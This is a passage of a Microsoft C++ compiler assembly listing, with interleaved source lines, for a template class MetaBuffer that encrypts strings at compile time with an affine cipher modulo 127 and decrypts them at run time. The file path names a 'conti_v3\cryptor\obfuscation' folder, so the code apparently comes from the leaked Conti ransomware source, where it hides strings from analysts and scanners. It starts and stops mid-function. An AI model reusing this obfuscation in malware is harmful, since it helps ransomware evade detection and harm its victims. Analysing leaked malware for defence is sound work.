  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv224 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00329	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0032d	88 85 c0 00 00
	00		 mov	 BYTE PTR tv224[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00333	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0033a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00341	5f		 pop	 rdi
  00342	5d		 pop	 rbp
  00343	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<79,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 07	 sub	 eax, 7
  0002d	6b c0 0f	 imul	 eax, eax, 15
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 11	 imul	 eax, eax, 17
  0002d	83 c0 07	 add	 eax, 7
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
